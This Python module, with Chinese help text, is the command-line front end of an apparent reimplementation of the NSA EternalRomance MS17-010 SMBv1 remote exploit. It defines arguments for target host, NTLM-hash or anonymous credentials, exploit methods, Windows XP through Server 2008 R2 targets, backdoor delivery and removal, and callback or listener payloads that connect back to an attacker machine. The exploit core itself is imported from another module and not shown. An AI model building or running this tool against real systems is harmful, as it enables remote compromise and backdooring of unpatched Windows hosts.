"""eternal-romance-1.4 — MS17-010 (ETERNALROMANCE / ETROMANCE) SMBv1 远程利用。

Python 重写的 NSA EternalRomance 利用工具 `Eternalsynergy-1.0.1.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 SMBv1/MS17-010 利用流程。
"""

from . import eternal_synergy


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def eternal_romance_14_handle(args):
    """Run the ETERNALROMANCE exploitation sequence against the supplied host."""
    return eternal_synergy.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        pipe=args.pipe,
        protocol=args.protocol,
        exploit_method=args.exploit_method,
        credentials=args.credentials,
        username=args.username,
        password=args.password,
        ntlm_hash=args.ntlm_hash,
        target_os=args.target_os,
        max_attempts=args.attempts,
        teardown_backdoor=args.teardown_backdoor,
        payload=args.payload,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        listen_port=args.listen_port,
        callin_port=args.callin_port,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `eternal-romance-1.4` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "eternal-romance-1.4",
        help="MS17-010 (ETERNALSYNERGY) SMBv1 远程利用",
        description="Python 重写的 NSA EternalRomance (ETROMANCE / MS17-010) 利用工具 "
                    "Eternalsynergy-1.0.1。通过 TCP 445/139 驱动 SMBv1/NBT，"
                    "执行架构识别、Transaction 泄漏、内存劫持与后门投递。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445,
        help="目标 TCP 端口（SMB 默认 445，NBT 默认 139）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时）",
    )
    p.add_argument(
        "--pipe", metavar="PIPE",
        help="命名管道名",
    )
    p.add_argument(
        "--protocol", choices=["SMB", "NBT"], default="SMB",
        help="协议类型（SMB 默认端口 445，NBT 默认端口 139）",
    )
    p.add_argument(
        "--exploit-method",
        choices=["Default", "Fish-in-a-barrel", "Matched-pairs", "Classic-Romance"],
        default="Default",
        help="利用方法（Default 自动选择最佳方法）",
    )
    p.add_argument(
        "--credentials",
        choices=["Anonymous", "Guest", "Blank", "Password", "NTLM"],
        default="Anonymous",
        help="凭证类型",
    )
    p.add_argument(
        "--username", metavar="HEX",
        help="用户名（十六进制字节，Unicode）",
    )
    p.add_argument(
        "--password", metavar="HEX",
        help="密码（十六进制字节，Unicode）",
    )
    p.add_argument(
        "--ntlm-hash", metavar="HEX",
        help="NTLM 密码哈希（十六进制）",
    )
    p.add_argument(
        "--target-os",
        choices=[
            "XP_SP0SP1_X86", "XP_SP2SP3_X86", "XP_SP1_X64", "XP_SP2_X64",
            "SERVER_2003_SP0", "SERVER_2003_SP1", "SERVER_2003_SP2",
            "VISTA_SP0", "VISTA_SP1", "VISTA_SP2",
            "SERVER_2008_SP0", "SERVER_2008_SP1", "SERVER_2008_SP2",
            "WIN7_SP0", "WIN7_SP1",
            "SERVER_2008R2_SP0", "SERVER_2008R2_SP1",
        ],
        help="目标操作系统与服务包",
    )
    p.add_argument(
        "--attempts", type=int, default=3,
        help="MaxExploitAttempts：最多尝试次数（默认 3）",
    )
    p.add_argument(
        "--teardown-backdoor", action="store_true",
        help="利用完成后移除后门",
    )
    p.add_argument(
        "--payload",
        choices=["Callback", "Listener"],
        default="Callback",
        help="载荷行为：Callback 连回攻击机，Listener 在目标开监听端口",
    )
    p.add_argument(
        "--callback-ip", metavar="IP",
        help="Callback 模式：载荷连回的 IP 地址",
    )
    p.add_argument(
        "--callback-port", type=int, metavar="PORT",
        help="Callback 模式：载荷连回的端口",
    )
    p.add_argument(
        "--callback-local-port", type=int, metavar="PORT",
        help="Callback 模式：本地监听端口",
    )
    p.add_argument(
        "--listen-port", type=int, metavar="PORT",
        help="Listener 模式：目标监听的端口",
    )
    p.add_argument(
        "--callin-port", type=int, metavar="PORT",
        help="Listener 模式：攻击机连回的端口",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=eternal_romance_14_handle)
